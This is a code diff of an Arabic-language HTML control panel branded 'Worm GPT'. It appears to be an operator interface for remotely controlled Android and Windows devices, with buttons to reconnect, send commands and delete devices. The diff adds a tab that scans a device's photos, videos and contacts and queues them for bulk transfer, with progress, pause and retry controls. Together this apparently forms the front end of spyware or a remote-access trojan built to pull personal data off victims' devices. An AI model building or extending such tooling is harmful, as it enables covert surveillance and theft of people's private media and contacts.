@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Worm Gitty — لوحة التحكم</title>
+  <title>Worm GPT — لوحة التحكم</title>
   <script type="module" src="/src/main.js"></script>
 </head>
 <body x-data="panelRoot">
   <span data-testid="app-ready" style="display:none" :data-ready="ready ? '1':'0'"></span>
   <div class="topbar">
-    <span class="brand">Worm Gitty</span>
+    <span class="brand">Worm GPT</span>
     <nav x-show="$store.panel.user" class="nav">
       <button data-testid="nav-android" @click="$store.panel.show('#/devices?platform=android')">أندرويد</button>
       <button data-testid="nav-windows" @click="$store.panel.show('#/devices?platform=windows')">ويندوز</button>
@@ -30,7 +30,7 @@
   </main>
 
   <!-- DEVICES LIST -->
-  <main id="screen-devices" x-show="$store.panel.route.name === 'devices'" x-init="">
+  <main id="screen-devices" x-show="$store.panel.route.name === 'devices'">
     <section class="state-block" data-testid="devices-loading" x-show="$store.panel.view === 'loading'">تحميل…</section>
 
     <section class="state-block" data-testid="devices-empty" x-show="$store.panel.view === 'empty'">
@@ -49,6 +49,11 @@
     <section class="state-block" data-testid="devices-server-error" x-show="$store.panel.view === 'server-error'">
       <span x-text="$store.panel.message"></span>
       <button data-testid="devices-retry" @click="$store.panel.reload()">إعادة المحاولة</button>
+    </section>
+
+    <section class="state-block" data-testid="devices-backend-down" x-show="$store.panel.view === 'backend-down'">
+      <span x-text="$store.panel.message"></span>
+      <button data-testid="devices-backend-retry" @click="$store.panel.reload()">إعادة المحاولة</button>
     </section>
 
     <table data-testid="devices-table" x-show="$store.panel.view === 'ready'" class="card">
@@ -91,7 +96,13 @@
       </p>
       <div class="actions">
         <button data-testid="detail-reconnect" @click="$store.panel.reconnect($store.panel.route.id)">إعادة ربط</button>
-        <button data-testid="detail-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">حذف</button>
+        <button data-testid="detail-delete" class="danger" x-show="!$store.panel.confirmDelete"
+                @click="$store.panel.requestRemove()">حذف</button>
+        <span x-show="$store.panel.confirmDelete" class="confirm-cluster">
+          <span class="warn">متأكد من الحذف؟</span>
+          <button data-testid="confirm-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">اتأكد واحذف</button>
+          <button data-testid="cancel-delete" @click="$store.panel.cancelRemove()">إلغاء</button>
+        </span>
         <select data-testid="command-select" x-model="$store.panel.commandChoice">
           <option value="ping">ping</option>
           <option value="sync_config">sync_config</option>
@@ -99,6 +110,66 @@
         <button data-testid="command-send" @click="$store.panel.sendCommand($store.panel.route.id)">ابعت</button>
         <span data-testid="command-flash" x-show="$store.panel.flash" x-text="$store.panel.flash"></span>
       </div>
+
+      <!-- PHOTOS TAB (mock-backed UI contract for the upcoming real feature) -->
+      <hr />
+      <section class="photos" data-testid="photos-tab">
+        <h3>فحص وسائط الجهاز</h3>
+        <div class="actions">
+          <button data-testid="photos-scan" :disabled="$store.panel.photos.loading"
+                  @click="$store.panel.scanDevice($store.panel.route.id)">فحص</button>
+          <span data-testid="photos-progress" x-show="$store.panel.photos.loading">جاري الفحص…</span>
+        </div>
+
+        <p data-testid="photos-summary" x-show="$store.panel.photos.summary && !$store.panel.photos.empty">
+          صور: <span data-testid="count-photos" x-text="$store.panel.photos.summary?.photos ?? 0"></span> /
+          فيديوهات: <span data-testid="count-videos" x-text="$store.panel.photos.summary?.videos ?? 0"></span> /
+          جهات اتصال: <span data-testid="count-contacts" x-text="$store.panel.photos.summary?.contacts ?? 0"></span>
+        </p>
+
+        <p data-testid="photos-empty" class="warn" x-show="$store.panel.photos.summary && $store.panel.photos.empty">
+          مفيش أي وسائط على الجهاز ده.
+        </p>
+
+        <div class="actions" x-show="!$store.panel.photos.empty && $store.panel.photos.summary">
+          <label>اختيار:</label>
+          <label><input type="radio" name="selmode" value="all" x-model="$store.panel.photos.mode" /> الكل</label>
+          <label><input type="radio" name="selmode" value="newest" x-model="$store.panel.photos.mode" /> الأحدث</label>
+          <label><input type="radio" name="selmode" value="largest" x-model="$store.panel.photos.mode" /> الأكبر</label>
+          <input data-testid="sel-limit" type="number" min="1" max="5000" style="width:90px"
+                 :disabled="$store.panel.photos.mode === 'all'"
+                 x-model.number="$store.panel.photos.limit" />
+          <button data-testid="photos-transfer" @click="$store.panel.enqueueTransfer($store.panel.route.id)">جهّز النقل</button>
+        </div>
+        <p data-testid="photos-error" class="error" x-show="$store.panel.photos.error" x-text="$store.panel.photos.error"></p>
+
+        <div x-show="$store.panel.photos.queue.length" class="queue-block">
+          <div class="actions">
+            <strong data-testid="progress-summary">
+              منتهي <span x-text="$store.panel.queueProgress().done"></span>/<span x-text="$store.panel.queueProgress().total"></span>
+            </strong>
+            <strong data-testid="mb-total"><span x-text="$store.panel.photos.sentMb"></span> MB</strong>
+            <button data-testid="pause-resume" @click="$store.panel.togglePause()"
+                    x-text="$store.panel.photos.paused ? 'استكمال' : 'إيقاف مؤقت'"></button>
+            <button data-testid="retry-failed" @click="$store.panel.retryFailed()">أعد الفاشل</button>
+            <button data-testid="simulate-glitch" title="محاكاة فشل صنفرى لأغراض العرض"
+                    @click="$store.panel.markRandomFailure(1)">simulate</button>
+          </div>
+          <table class="card queue">
+            <thead><tr><th>الملف</th><th>النوع</th><th>MB</th><th>الحالة</th></tr></thead>
+            <tbody>
+              <template x-for="q in $store.panel.photos.queue" :key="q.id">
+                <tr :data-testid="'queue-row-' + q.pos" :class="'st-' + q.state">
+                  <td x-text="q.name"></td>
+                  <td x-text="q.kind"></td>
+                  <td x-text="q.sizeMb"></td>
+                  <td><span class="badge" :class="'badge-q-' + q.state" x-text="q.state"></span></td>
+                </tr>
+              </template>
+            </tbody>
+          </table>
+        </div>
+      </section>
     </article>
   </main>
 </body>
